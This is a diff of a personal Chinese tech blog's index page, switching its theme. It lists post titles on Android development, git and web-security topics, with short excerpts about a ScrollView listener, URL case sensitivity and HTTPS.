@@ -1,1451 +1,1618 @@
 <!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="utf-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI" />
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <meta name="description" content="心中有光の孩子">
-    <meta name="keyword"  content="tea9">
-    <link rel="shortcut icon" href="/img/favicon.ico">
+<html>
+  <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+    <meta http-equiv="Cache-Control" content="no-siteapp">
+    <meta http-equiv="Cache-Control" content="no-transform">
+    <meta name="renderer" content="webkit|ie-comp|ie-stand">
+    <meta name="apple-mobile-web-app-capable" content="tea9的博客">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <meta name="format-detection" content="telephone=no,email=no,adress=no">
+    <meta name="browsermode" content="application">
+    <meta name="screen-orientation" content="portrait">
+    <link rel="dns-prefetch" href="http://tea9.xyz">
+  	<link rel="stylesheet" href="/css/style.css">
+  	<link rel="stylesheet" href="/css/github-gist.css">
+    <!--SEO-->
 
-    <title>
-        
-        tea9的博客 | tea9&#39;s Blog
-        
-    </title>
+<meta name="description" content="心中有光の孩子"/>
 
-    <!-- Custom CSS -->
-    <link rel="stylesheet" href="/css/aircloud.css">
-    <link rel="stylesheet" href="/css/gitment.css">
-    <!--<link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css">-->
-    <link href="//at.alicdn.com/t/font_620856_pl6z7sid89qkt9.css" rel="stylesheet" type="text/css">
-    <!-- ga & ba script hoook -->
-    <script></script>
+
+<meta name="keywords" content="tea9,tea9的博客,开发,android,安全"/>
+
+
+<meta name="robots" content="all" />
+<meta name="google" content="all" />
+<meta name="googlebot" content="all" />
+<meta name="verify" content="all" />
+    <!--Title-->
+
+
+<title>tea9的博客</title>
+
+
+    <link rel="alternate" href="/atom.xml" title="tea9的博客" type="application/atom+xml">
+
+
+    <link rel="icon" href="/favicon.ico">
+
     
 
-<!--一言-->
 
-    <!-- 以下写法，选取一种即可 -->
 
-    <!-- 现代写法，推荐 -->
-    <!-- 兼容低版本浏览器 (包括 IE)，可移除 -->
-    <script src="https://cdn.jsdelivr.net/npm/bluebird@3/js/browser/bluebird.min.js"></script>
-    <script src="https://cdn.jsdelivr.net/npm/whatwg-fetch@2.0.3/fetch.min.js"></script>
-    <!--End-->
     <script>
-      fetch('https://v1.hitokoto.cn')
-        .then(function (res){
-          return res.json();
-        })
-        .then(function (data) {
-          var hitokoto = document.getElementById('hitokoto');
-          hitokoto.innerText = data.hitokoto; 
-        })
-        .catch(function (err) {
-          console.error(err);
-        })
+        var _hmt = _hmt || [];
+        (function() {
+            var hm = document.createElement("script");
+            hm.src = "https://hm.baidu.com/hm.js?1d283676d7e81d10054b06f70a90decf";
+            var s = document.getElementsByTagName("script")[0];
+            s.parentNode.insertBefore(hm, s);
+        })();
     </script>
 
-<!--一言end-->
+
+
+    
 </head>
-
-<body>
-
-<div class="site-nav-toggle" id="site-nav-toggle">
-    <button>
-        <span class="btn-bar"></span>
-        <span class="btn-bar"></span>
-        <span class="btn-bar"></span>
-    </button>
+  <body>
+    <div class="container">
+	<header class="header">
+	  <div class="blog-title">
+	    <a href="/"> <img src="/img/logo.png"></a>
+	  </div>
+	  <nav>
+	    <ul class="menu">
+	      
+	        <li class="menu-item">
+	          <a href="/" class="menu-item-link nav-underline">首页</a>
+	        </li>&sdot;
+	      
+	        <li class="menu-item">
+	          <a href="/archives" class="menu-item-link nav-underline">归档</a>
+	        </li>&sdot;
+	      
+	        <li class="menu-item">
+	          <a href="/links" class="menu-item-link nav-underline">友链</a>
+	        </li>&sdot;
+	      
+	      	<li class="menu-item">
+	          <a href="/about" class="menu-item-link nav-underline">关于</a>
+	        </li>
+	    </ul>
+	  </nav>
+	</header>
 </div>
+<hr />
+    <div class="container">
+	
+	<section class="posts">
+	  
+	    <article class="post">
+	      <div class="post-title">
+	        <a href="/post/2984908294.html">android滑动监听事件折叠菜单</a>
+	      </div>
+	      <p>
+	      	
+                效果如下  
 
-<div class="index-about" id="hitokoto">
-    <i> 加油 </i>
-</div>
-
-<div class="index-container">
-    
-    <div class="index-left">
-        
-<div class="nav" id="nav">
-    <div class="avatar-name">
-        <div class="avatar radius">
-            <img src="/img/avatar.png" />
-        </div>
-        <div class="name">
-            <i>tea9</i>
-        </div>
-    </div>
-    <div class="contents" id="nav-content">
-        <ul>
-            <li  class=active >
-                <a href="/">
-                    <i class="iconfont icon-shouye1"></i>
-                    <span>HOME</span>
-                </a>
-            </li>
-            <!--<li >
-                <a href="/tags">
-                    <i class="iconfont icon-biaoqian1"></i>
-                    <span>TAGS</span>
-                </a>
-            </li>-->
-            <!--<li >
-                <a href="/category">
-                    <i class="iconfont icon-biaoqian1"></i>
-                    <span>CATAGORY</span>
-                </a>
-            </li>-->
-            <li >
-                <a href="/archives">
-                    <i class="iconfont icon-guidang2"></i>
-                    <span>ARCHIVES</span>
-                </a>
-            </li>
-            <li >
-                <a href="/about/">
-                    <i class="iconfont icon-guanyu2"></i>
-                    <span>ABOUT</span>
-                </a>
-            </li>
+思路1.定义两个title布局2.监听ScrollView控件在下面布局不可见的时候显示第二个title布局  
+关键代码：java：  
+scrollView.setOnScrollChangeListener(new View.OnScrollChangeListener() {
+    @Override
+    public v...
             
-            <li>
-                <a id="search">
-                    <i class="iconfont icon-sousuo1"></i>
-                    <span>SEARCH</span>
-                </a>
-            </li>
+	      </p>
+	       <div class="post-meta">
+	
+	    <a class="article-category-link" href="/category/android/">android</a>
+	&nbsp;&nbsp;&sdot;&nbsp;&nbsp;
+	<i class="iconfont text-small">&#xe6f3;</i> ：2018-10-18&nbsp;&nbsp;&sdot;&nbsp;&nbsp;
+	
+		<i class="iconfont text-small">&#xe6c5;</i> ：
+	  <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/android/">android</a></li></ul>
+	
+</div>
+
+	    </article>
+	    <hr class="two">
+	  
+	    <article class="post">
+	      <div class="post-title">
+	        <a href="/post/1353455041.html">URL中的大小写敏感</a>
+	      </div>
+	      <p>
+	      	
+                URL中的大小写敏感http://fred:wilma@www.example.com/private.asp?doc=3&amp;amp;part=4#footer
+
+协议标示符 （http/https） 大小写不敏感 HTTP、http、hTtP  
+
+用户ID和密码 （fred和wilma）可能大小写敏感 取决于你的服务器软件  
+
+机器的名称（www....
             
-        </ul>
-    </div>
-    
+	      </p>
+	       <div class="post-meta">
+	
+	    <a class="article-category-link" href="/category/web安全/">web安全</a>
+	&nbsp;&nbsp;&sdot;&nbsp;&nbsp;
+	<i class="iconfont text-small">&#xe6f3;</i> ：2018-10-15&nbsp;&nbsp;&sdot;&nbsp;&nbsp;
+	
+		<i class="iconfont text-small">&#xe6c5;</i> ：
+	  <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/tips/">tips</a></li></ul>
+	
 </div>
 
-
-<div class="search-field" id="search-field">
-    <div class="search-container">
-        <div class="search-input">
-            <span id="esc-search"> <i class="icon-fanhui iconfont"></i></span>
-            <input id="search-input"/>
-            <span id="begin-search">search</span>
-        </div>
-        <div class="search-result-container" id="search-result-container">
-
-        </div>
-    </div>
+	    </article>
+	    <hr class="two">
+	  
+	    <article class="post">
+	      <div class="post-title">
+	        <a href="/post/902500137.html">SSL和HTTPS</a>
+	      </div>
+	      <p>
+	      	
+                SSL和HTTPS加密技术只能保护你的会话所使用的信道。它保护通信不被窃听，甚至能够让你更加肯定正在交谈的两台计算机的身份，而我们所测试的是在通信末端的软件的行为。HTTP和HTTPS之间唯一的区别在于HTTPS连接在初始化有额外的设置。它建立起一条安全信道，然后通过这条安全信道来发送标准的HTTP。你将会看到，测试HTTPS应用时，通常你需要做的唯一...
+            
+	      </p>
+	       <div class="post-meta">
+	
+	    <a class="article-category-link" href="/category/web安全/">web安全</a>
+	&nbsp;&nbsp;&sdot;&nbsp;&nbsp;
+	<i class="iconfont text-small">&#xe6f3;</i> ：2018-10-15&nbsp;&nbsp;&sdot;&nbsp;&nbsp;
+	
+		<i class="iconfont text-small">&#xe6c5;</i> ：
+	  <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/tips/">tips</a></li></ul>
+	
 </div>
 
-        <div class="index-about-mobile">
-            <i> 加油 </i>
-        </div>
-    </div>
-    
-    <div class="index-middle">
-        <!-- Main Content -->
-        
-<div class="post-preview-container" style="min-height: 720px">
-    
-    <div class="post-preview">
-        <div class="post-time">2018-10-18</div>
-        <div class="post-info">
-            <a href="/post/2984908294.html">
-                <h3>
-                    android滑动监听事件折叠菜单
-                </h3>
-            </a>
-            <p>
-                
-                <span>/</span>
-                
-                <a class="tag" href="/tags/#android" title="android">android</a>
-                <span>/</span>
-                
-                
-            </p>
-        </div>
-    </div>
-    
-    <div class="post-preview">
-        <div class="post-time">2018-10-15</div>
-        <div class="post-info">
-            <a href="/post/1353455041.html">
-                <h3>
-                    URL中的大小写敏感
-                </h3>
-            </a>
-            <p>
-                
-                <span>/</span>
-                
-                <a class="tag" href="/tags/#tips" title="tips">tips</a>
-                <span>/</span>
-                
-                
-            </p>
-        </div>
-    </div>
-    
-    <div class="post-preview">
-        <div class="post-time">2018-10-15</div>
-        <div class="post-info">
-            <a href="/post/902500137.html">
-                <h3>
-                    SSL和HTTPS
-                </h3>
-            </a>
-            <p>
-                
-                <span>/</span>
-                
-                <a class="tag" href="/tags/#tips" title="tips">tips</a>
-                <span>/</span>
-                
-                
-            </p>
-        </div>
-    </div>
-    
-    <div class="post-preview">
-        <div class="post-time">2018-10-12</div>
-        <div class="post-info">
-            <a href="/post/3612980045.html">
-                <h3>
-                    termux相关
-                </h3>
-            </a>
-            <p>
-                
-                <span>/</span>
-                
-                <a class="tag" href="/tags/#安全" title="安全">安全</a>
-                <span>/</span>
-                
-                <a class="tag" href="/tags/#termux" title="termux">termux</a>
-                <span>/</span>
-                
-                
-            </p>
-        </div>
-    </div>
-    
-    <div class="post-preview">
-        <div class="post-time">2018-10-11</div>
-        <div class="post-info">
-            <a href="/post/2159052339.html">
-                <h3>
-                    1.sql注入基础
-                </h3>
-            </a>
-            <p>
-                
-                <span>/</span>
-                
-                <a class="tag" href="/tags/#web安全" title="web安全">web安全</a>
-                <span>/</span>
-                
-                <a class="tag" href="/tags/#sql注入" title="sql注入">sql注入</a>
-                <span>/</span>
-                
-                
-            </p>
-        </div>
-    </div>
-    
-    <div class="post-preview">
-        <div class="post-time">2018-10-05</div>
-        <div class="post-info">
-            <a href="/post/3180077102.html">
-                <h3>
-                    xss的语句
-                </h3>
-            </a>
-            <p>
-                
-                <span>/</span>
-                
-                <a class="tag" href="/tags/#web安全" title="web安全">web安全</a>
-                <span>/</span>
-                
-                <a class="tag" href="/tags/#xss" title="xss">xss</a>
-                <span>/</span>
-                
-                
-            </p>
-        </div>
-    </div>
-    
-    <div class="post-preview">
-        <div class="post-time">2018-09-23</div>
-        <div class="post-info">
-            <a href="/post/1087166143.html">
-                <h3>
-                    cv古风剧本
-                </h3>
-            </a>
-            <p>
-                
-                <span>/</span>
-                
-                <a class="tag" href="/tags/#cv" title="cv">cv</a>
-                <span>/</span>
-                
-                
-            </p>
-        </div>
-    </div>
-    
-    <div class="post-preview">
-        <div class="post-time">2018-09-16</div>
-        <div class="post-info">
-            <a href="/post/2435934763.html">
-                <h3>
-                    区块链学习
-                </h3>
-            </a>
-            <p>
-                
-                <span>/</span>
-                
-                <a class="tag" href="/tags/#区块链" title="区块链">区块链</a>
-                <span>/</span>
-                
-                
-            </p>
-        </div>
-    </div>
-    
-    <div class="post-preview">
-        <div class="post-time">2018-09-16</div>
-        <div class="post-info">
-            <a href="/post/3799772689.html">
-                <h3>
-                    solidity的代码
-                </h3>
-            </a>
-            <p>
-                
-                <span>/</span>
-                
-                <a class="tag" href="/tags/#区块链" title="区块链">区块链</a>
-                <span>/</span>
-                
-                
-            </p>
-        </div>
-    </div>
-    
-    <div class="post-preview">
-        <div class="post-time">2018-09-14</div>
-        <div class="post-info">
-            <a href="/post/1182005409.html">
-                <h3>
-                    1.android布局-ConstraintLayout-约束布局-例子
-                </h3>
-            </a>
-            <p>
-                
-                <span>/</span>
-                
-                <a class="tag" href="/tags/#android" title="android">android</a>
-                <span>/</span>
-                
-                
-            </p>
-        </div>
-    </div>
-    
-    <div class="post-preview">
-        <div class="post-time">2018-09-07</div>
-        <div class="post-info">
-            <a href="/post/3415919552.html">
-                <h3>
-                    内网提权命令
-                </h3>
-            </a>
-            <p>
-                
-                <span>/</span>
-                
-                <a class="tag" href="/tags/#web安全" title="web安全">web安全</a>
-                <span>/</span>
-                
-                
-            </p>
-        </div>
-    </div>
-    
-    <div class="post-preview">
-        <div class="post-time">2018-09-06</div>
-        <div class="post-info">
-            <a href="/post/1523215152.html">
-                <h3>
-                    博客说明
-                </h3>
-            </a>
-            <p>
-                
-                <span>/</span>
-                
-                <a class="tag" href="/tags/#blog" title="blog">blog</a>
-                <span>/</span>
-                
-                
-            </p>
-        </div>
-    </div>
-    
-    <div class="post-preview">
-        <div class="post-time">2018-09-04</div>
-        <div class="post-info">
-            <a href="/post/2080958988.html">
-                <h3>
-                    android复杂布局
-                </h3>
-            </a>
-            <p>
-                
-                <span>/</span>
-                
-                <a class="tag" href="/tags/#android" title="android">android</a>
-                <span>/</span>
-                
-                
-            </p>
-        </div>
-    </div>
-    
-    <div class="post-preview">
-        <div class="post-time">2018-08-31</div>
-        <div class="post-info">
-            <a href="/post/2226304841.html">
-                <h3>
-                    Android的命令
-                </h3>
-            </a>
-            <p>
-                
-                <span>/</span>
-                
-                <a class="tag" href="/tags/#android" title="android">android</a>
-                <span>/</span>
-                
-                <a class="tag" href="/tags/#android逆向" title="android逆向">android逆向</a>
-                <span>/</span>
-                
-                
-            </p>
-        </div>
-    </div>
-    
-    <div class="post-preview">
-        <div class="post-time">2018-08-15</div>
-        <div class="post-info">
-            <a href="/post/3697117284.html">
-                <h3>
-                    RPG_Maker_MV-安卓HTML一键打包
-                </h3>
-            </a>
-            <p>
-                
-                <span>/</span>
-                
-                <a class="tag" href="/tags/#rpgmakermv" title="rpgmakermv">rpgmakermv</a>
-                <span>/</span>
-                
-                
-            </p>
-        </div>
-    </div>
-    
-    <div class="post-preview">
-        <div class="post-time">2018-08-10</div>
-        <div class="post-info">
-            <a href="/post/2113223531.html">
-                <h3>
-                    设计模式-策略模式（strategy）
-                </h3>
-            </a>
-            <p>
-                
-                <span>/</span>
-                
-                <a class="tag" href="/tags/#设计模式" title="设计模式">设计模式</a>
-                <span>/</span>
-                
-                
-            </p>
-        </div>
-    </div>
-    
-    <div class="post-preview">
-        <div class="post-time">2018-08-10</div>
-        <div class="post-info">
-            <a href="/post/912287952.html">
-                <h3>
-                    一些ctf的链接
-                </h3>
-            </a>
-            <p>
-                
-                <span>/</span>
-                
-                <a class="tag" href="/tags/#ctf" title="ctf">ctf</a>
-                <span>/</span>
-                
-                
-            </p>
-        </div>
-    </div>
-    
-    <div class="post-preview">
-        <div class="post-time">2018-08-10</div>
-        <div class="post-info">
-            <a href="/post/2289611691.html">
-                <h3>
-                    fragment懒加载
-                </h3>
-            </a>
-            <p>
-                
-                <span>/</span>
-                
-                <a class="tag" href="/tags/#android" title="android">android</a>
-                <span>/</span>
-                
-                
-            </p>
-        </div>
-    </div>
-    
-    <div class="post-preview">
-        <div class="post-time">2018-08-10</div>
-        <div class="post-info">
-            <a href="/post/744454998.html">
-                <h3>
-                    Git命令行基础
-                </h3>
-            </a>
-            <p>
-                
-                <span>/</span>
-                
-                <a class="tag" href="/tags/#git" title="git">git</a>
-                <span>/</span>
-                
-                
-            </p>
-        </div>
-    </div>
-    
-    <div class="post-preview">
-        <div class="post-time">2018-08-09</div>
-        <div class="post-info">
-            <a href="/post/1340440380.html">
-                <h3>
-                    Burp抓Android的包
-                </h3>
-            </a>
-            <p>
-                
-                <span>/</span>
-                
-                <a class="tag" href="/tags/#android逆向" title="android逆向">android逆向</a>
-                <span>/</span>
-                
-                <a class="tag" href="/tags/#android安全" title="android安全">android安全</a>
-                <span>/</span>
-                
-                
-            </p>
-        </div>
-    </div>
-    
-    <div class="post-preview">
-        <div class="post-time">2018-08-03</div>
-        <div class="post-info">
-            <a href="/post/3004991132.html">
-                <h3>
-                    CTF入门如何学习
-                </h3>
-            </a>
-            <p>
-                
-                <span>/</span>
-                
-                <a class="tag" href="/tags/#ctf" title="ctf">ctf</a>
-                <span>/</span>
-                
-                
-            </p>
-        </div>
-    </div>
-    
-    <div class="post-preview">
-        <div class="post-time">2018-08-03</div>
-        <div class="post-info">
-            <a href="/post/576883658.html">
-                <h3>
-                    mac_终端用sublime打开文件
-                </h3>
-            </a>
-            <p>
-                
-                <span>/</span>
-                
-                <a class="tag" href="/tags/#macos" title="macos">macos</a>
-                <span>/</span>
-                
-                
-            </p>
-        </div>
-    </div>
-    
-    <div class="post-preview">
-        <div class="post-time">2018-07-19</div>
-        <div class="post-info">
-            <a href="/post/1524903793.html">
-                <h3>
-                    git切换远程分支命令
-                </h3>
-            </a>
-            <p>
-                
-                <span>/</span>
-                
-                <a class="tag" href="/tags/#git" title="git">git</a>
-                <span>/</span>
-                
-                <a class="tag" href="/tags/#branch" title="branch">branch</a>
-                <span>/</span>
-                
-                
-            </p>
-        </div>
-    </div>
-    
-    <div class="post-preview">
-        <div class="post-time">2018-07-19</div>
-        <div class="post-info">
-            <a href="/post/2419343777.html">
-                <h3>
-                    2.1.1-文件上传流动原理与流程-上传检测流程
-                </h3>
-            </a>
-            <p>
-                
-                <span>/</span>
-                
-                <a class="tag" href="/tags/#web安全" title="web安全">web安全</a>
-                <span>/</span>
-                
-                <a class="tag" href="/tags/#文件上传漏洞" title="文件上传漏洞">文件上传漏洞</a>
-                <span>/</span>
-                
-                
-            </p>
-        </div>
-    </div>
-    
-    <div class="post-preview">
-        <div class="post-time">2018-07-19</div>
-        <div class="post-info">
-            <a href="/post/1065774692.html">
-                <h3>
-                    blog链接
-                </h3>
-            </a>
-            <p>
-                
-                <span>/</span>
-                
-                <a class="tag" href="/tags/#link" title="link">link</a>
-                <span>/</span>
-                
-                
-            </p>
-        </div>
-    </div>
-    
-    <div class="post-preview">
-        <div class="post-time">2018-07-18</div>
-        <div class="post-info">
-            <a href="/post/912983995.html">
-                <h3>
-                    2.1.1-文件上传流动原理与流程-文件上传漏洞原理
-                </h3>
-            </a>
-            <p>
-                
-                <span>/</span>
-                
-                <a class="tag" href="/tags/#文件上传漏洞" title="文件上传漏洞">文件上传漏洞</a>
-                <span>/</span>
-                
-                
-            </p>
-        </div>
-    </div>
-    
-    <div class="post-preview">
-        <div class="post-time">2018-07-14</div>
-        <div class="post-info">
-            <a href="/post/2167877018.html">
-                <h3>
-                    一些天文的链接
-                </h3>
-            </a>
-            <p>
-                
-                <span>/</span>
-                
-                <a class="tag" href="/tags/#天文" title="天文">天文</a>
-                <span>/</span>
-                
-                
-            </p>
-        </div>
-    </div>
-    
-    <div class="post-preview">
-        <div class="post-time">2018-07-07</div>
-        <div class="post-info">
-            <a href="/post/4129675987.html">
-                <h3>
-                    android反编译工具和命令
-                </h3>
-            </a>
-            <p>
-                
-                <span>/</span>
-                
-                <a class="tag" href="/tags/#android逆向" title="android逆向">android逆向</a>
-                <span>/</span>
-                
-                <a class="tag" href="/tags/#adnroid安全" title="adnroid安全">adnroid安全</a>
-                <span>/</span>
-                
-                <a class="tag" href="/tags/#android反编译" title="android反编译">android反编译</a>
-                <span>/</span>
-                
-                
-            </p>
-        </div>
-    </div>
-    
-    <div class="post-preview">
-        <div class="post-time">2018-07-06</div>
-        <div class="post-info">
-            <a href="/post/4082916186.html">
-                <h3>
-                    2.Markdown使用说明
-                </h3>
-            </a>
-            <p>
-                
-                <span>/</span>
-                
-                <a class="tag" href="/tags/#blog" title="blog">blog</a>
-                <span>/</span>
-                
-                <a class="tag" href="/tags/#jekyll" title="jekyll">jekyll</a>
-                <span>/</span>
-                
-                
-            </p>
-        </div>
-    </div>
-    
-    <div class="post-preview">
-        <div class="post-time">2018-07-06</div>
-        <div class="post-info">
-            <a href="/post/758044765.html">
-                <h3>
-                    android思维导图
-                </h3>
-            </a>
-            <p>
-                
-                <span>/</span>
-                
-                <a class="tag" href="/tags/#android" title="android">android</a>
-                <span>/</span>
-                
-                
-            </p>
-        </div>
-    </div>
-    
-    <div class="post-preview">
-        <div class="post-time">2018-07-06</div>
-        <div class="post-info">
-            <a href="/post/41038608.html">
-                <h3>
-                    1.4.2-SQL注入防御绕过-二次编码注入
-                </h3>
-            </a>
-            <p>
-                
-                <span>/</span>
-                
-                <a class="tag" href="/tags/#sql注入" title="sql注入">sql注入</a>
-                <span>/</span>
-                
-                
-            </p>
-        </div>
-    </div>
-    
-    <div class="post-preview">
-        <div class="post-time">2018-07-03</div>
-        <div class="post-info">
-            <a href="/post/395714690.html">
-                <h3>
-                    1.自制脚本语言-第一章笔记
-                </h3>
-            </a>
-            <p>
-                
-                <span>/</span>
-                
-                <a class="tag" href="/tags/#脚本语言" title="脚本语言">脚本语言</a>
-                <span>/</span>
-                
-                
-            </p>
-        </div>
-    </div>
-    
-    <div class="post-preview">
-        <div class="post-time">2018-07-03</div>
-        <div class="post-info">
-            <a href="/post/3011557691.html">
-                <h3>
-                    1.android布局-ConstraintLayout-约束布局
-                </h3>
-            </a>
-            <p>
-                
-                <span>/</span>
-                
-                <a class="tag" href="/tags/#android" title="android">android</a>
-                <span>/</span>
-                
-                
-            </p>
-        </div>
-    </div>
-    
-    <div class="post-preview">
-        <div class="post-time">2018-06-30</div>
-        <div class="post-info">
-            <a href="/post/2024290485.html">
-                <h3>
-                    1.4.1-SQL注入防御绕过-宽字节注入
-                </h3>
-            </a>
-            <p>
-                
-                <span>/</span>
-                
-                <a class="tag" href="/tags/#web安全" title="web安全">web安全</a>
-                <span>/</span>
-                
-                <a class="tag" href="/tags/#sql注入" title="sql注入">sql注入</a>
-                <span>/</span>
-                
-                
-            </p>
-        </div>
-    </div>
-    
-    <div class="post-preview">
-        <div class="post-time">2018-06-25</div>
-        <div class="post-info">
-            <a href="/post/2129490429.html">
-                <h3>
-                    github上fork了别人的项目后，再同步更新别人的提交
-                </h3>
-            </a>
-            <p>
-                
-                <span>/</span>
-                
-                <a class="tag" href="/tags/#马克" title="马克">马克</a>
-                <span>/</span>
-                
-                <a class="tag" href="/tags/#git" title="git">git</a>
-                <span>/</span>
-                
-                
-            </p>
-        </div>
-    </div>
-    
-    <div class="post-preview">
-        <div class="post-time">2018-06-24</div>
-        <div class="post-info">
-            <a href="/post/2319578569.html">
-                <h3>
-                    jekyll-theme-H2O的gitalk相关配置
-                </h3>
-            </a>
-            <p>
-                
-                <span>/</span>
-                
-                <a class="tag" href="/tags/#blog" title="blog">blog</a>
-                <span>/</span>
-                
-                <a class="tag" href="/tags/#jekyll" title="jekyll">jekyll</a>
-                <span>/</span>
-                
-                <a class="tag" href="/tags/#gitalk" title="gitalk">gitalk</a>
-                <span>/</span>
-                
-                
-            </p>
-        </div>
-    </div>
-    
-    <div class="post-preview">
-        <div class="post-time">2018-06-23</div>
-        <div class="post-info">
-            <a href="/post/2964387005.html">
-                <h3>
-                    1.3.3-SQL注入-SQL盲注-Dnslog盲注
-                </h3>
-            </a>
-            <p>
-                
-                <span>/</span>
-                
-                <a class="tag" href="/tags/#sql注入" title="sql注入">sql注入</a>
-                <span>/</span>
-                
-                <a class="tag" href="/tags/#sql盲注" title="sql盲注">sql盲注</a>
-                <span>/</span>
-                
-                
-            </p>
-        </div>
-    </div>
-    
-    <div class="post-preview">
-        <div class="post-time">2018-06-23</div>
-        <div class="post-info">
-            <a href="/post/4135600167.html">
-                <h3>
-                    1.3.2-SQL注入-SQL盲注-时间盲注
-                </h3>
-            </a>
-            <p>
-                
-                <span>/</span>
-                
-                <a class="tag" href="/tags/#sql注入" title="sql注入">sql注入</a>
-                <span>/</span>
-                
-                <a class="tag" href="/tags/#sql盲注" title="sql盲注">sql盲注</a>
-                <span>/</span>
-                
-                
-            </p>
-        </div>
-    </div>
-    
-    <div class="post-preview">
-        <div class="post-time">2018-06-21</div>
-        <div class="post-info">
-            <a href="/post/273860866.html">
-                <h3>
-                    android微信第三方登录2
-                </h3>
-            </a>
-            <p>
-                
-                <span>/</span>
-                
-                <a class="tag" href="/tags/#android" title="android">android</a>
-                <span>/</span>
-                
-                <a class="tag" href="/tags/#weixin" title="weixin">weixin</a>
-                <span>/</span>
-                
-                
-            </p>
-        </div>
-    </div>
-    
-    <div class="post-preview">
-        <div class="post-time">2018-06-21</div>
-        <div class="post-info">
-            <a href="/post/2304481464.html">
-                <h3>
-                    android微信第三方登录1
-                </h3>
-            </a>
-            <p>
-                
-                <span>/</span>
-                
-                <a class="tag" href="/tags/#android" title="android">android</a>
-                <span>/</span>
-                
-                <a class="tag" href="/tags/#weixin" title="weixin">weixin</a>
-                <span>/</span>
-                
-                
-            </p>
-        </div>
-    </div>
-    
-    <div class="post-preview">
-        <div class="post-time">2018-06-21</div>
-        <div class="post-info">
-            <a href="/post/1015207598.html">
-                <h3>
-                    recyclerview嵌套recyclerview
-                </h3>
-            </a>
-            <p>
-                
-                <span>/</span>
-                
-                <a class="tag" href="/tags/#adnroid" title="adnroid">adnroid</a>
-                <span>/</span>
-                
-                <a class="tag" href="/tags/#recyclerview" title="recyclerview">recyclerview</a>
-                <span>/</span>
-                
-                
-            </p>
-        </div>
-    </div>
-    
-    <div class="post-preview">
-        <div class="post-time">2018-06-21</div>
-        <div class="post-info">
-            <a href="/post/3369655730.html">
-                <h3>
-                    android EventBus 使用
-                </h3>
-            </a>
-            <p>
-                
-                <span>/</span>
-                
-                <a class="tag" href="/tags/#android" title="android">android</a>
-                <span>/</span>
-                
-                <a class="tag" href="/tags/#eventbus" title="eventbus">eventbus</a>
-                <span>/</span>
-                
-                
-            </p>
-        </div>
-    </div>
-    
-    <div class="post-preview">
-        <div class="post-time">2018-06-21</div>
-        <div class="post-info">
-            <a href="/post/208407023.html">
-                <h3>
-                    android 代码样式规范
-                </h3>
-            </a>
-            <p>
-                
-                <span>/</span>
-                
-                <a class="tag" href="/tags/#android" title="android">android</a>
-                <span>/</span>
-                
-                <a class="tag" href="/tags/#code_standard" title="code_standard">code_standard</a>
-                <span>/</span>
-                
-                
-            </p>
-        </div>
-    </div>
-    
-    <div class="post-preview">
-        <div class="post-time">2018-06-21</div>
-        <div class="post-info">
-            <a href="/post/2904355367.html">
-                <h3>
-                    1.3.1-SQL注入-SQL盲注-布尔盲注
-                </h3>
-            </a>
-            <p>
-                
-                <span>/</span>
-                
-                <a class="tag" href="/tags/#sql注入" title="sql注入">sql注入</a>
-                <span>/</span>
-                
-                <a class="tag" href="/tags/#sql盲注" title="sql盲注">sql盲注</a>
-                <span>/</span>
-                
-                
-            </p>
-        </div>
-    </div>
-    
-    <div class="post-preview">
-        <div class="post-time">2018-06-17</div>
-        <div class="post-info">
-            <a href="/post/378823961.html">
-                <h3>
-                    网络课程列表
-                </h3>
-            </a>
-            <p>
-                
-                <span>/</span>
-                
-                <a class="tag" href="/tags/#web安全" title="web安全">web安全</a>
-                <span>/</span>
-                
-                <a class="tag" href="/tags/#课程" title="课程">课程</a>
-                <span>/</span>
-                
-                <a class="tag" href="/tags/#密码" title="密码">密码</a>
-                <span>/</span>
-                
-                <a class="tag" href="/tags/#推荐" title="推荐">推荐</a>
-                <span>/</span>
-                
-                
-            </p>
-        </div>
-    </div>
-    
-    <div class="post-preview">
-        <div class="post-time">2018-06-16</div>
-        <div class="post-info">
-            <a href="/post/4239639054.html">
-                <h3>
-                    1.2.2-SQL注入-SQL注入语法类型-报错注入
-                </h3>
-            </a>
-            <p>
-                
-                <span>/</span>
-                
-                <a class="tag" href="/tags/#sql注入" title="sql注入">sql注入</a>
-                <span>/</span>
-                
-                
-            </p>
-        </div>
-    </div>
-    
-    <div class="post-preview">
-        <div class="post-time">2018-06-16</div>
-        <div class="post-info">
-            <a href="/post/2839042794.html">
-                <h3>
-                    1.2.1-SQL注入-SQL注入语法类型-union联合查询注入
-                </h3>
-            </a>
-            <p>
-                
-                <span>/</span>
-                
-                <a class="tag" href="/tags/#sql注入" title="sql注入">sql注入</a>
-                <span>/</span>
-                
-                
-            </p>
-        </div>
-    </div>
-    
-    <div class="post-preview">
-        <div class="post-time">2018-06-13</div>
-        <div class="post-info">
-            <a href="/post/2422499851.html">
-                <h3>
-                    启动docker_sqli-labs_命令
-                </h3>
-            </a>
-            <p>
-                
-                <span>/</span>
-                
-                <a class="tag" href="/tags/#web安全" title="web安全">web安全</a>
-                <span>/</span>
-                
-                <a class="tag" href="/tags/#docker" title="docker">docker</a>
-                <span>/</span>
-                
-                <a class="tag" href="/tags/#sqli-labs" title="sqli-labs">sqli-labs</a>
-                <span>/</span>
-                
-                
-            </p>
-        </div>
-    </div>
-    
-    <div class="post-preview">
-        <div class="post-time">2018-06-12</div>
-        <div class="post-info">
-            <a href="/post/849770471.html">
-                <h3>
-                    使用pyenv切换python版本
-                </h3>
-            </a>
-            <p>
-                
-                <span>/</span>
-                
-                <a class="tag" href="/tags/#python" title="python">python</a>
-                <span>/</span>
-                
-                <a class="tag" href="/tags/#pyenv" title="pyenv">pyenv</a>
-                <span>/</span>
-                
-                
-            </p>
-        </div>
-    </div>
-    
-    <div class="post-preview">
-        <div class="post-time">2018-06-11</div>
-        <div class="post-info">
-            <a href="/post/1786754042.html">
-                <h3>
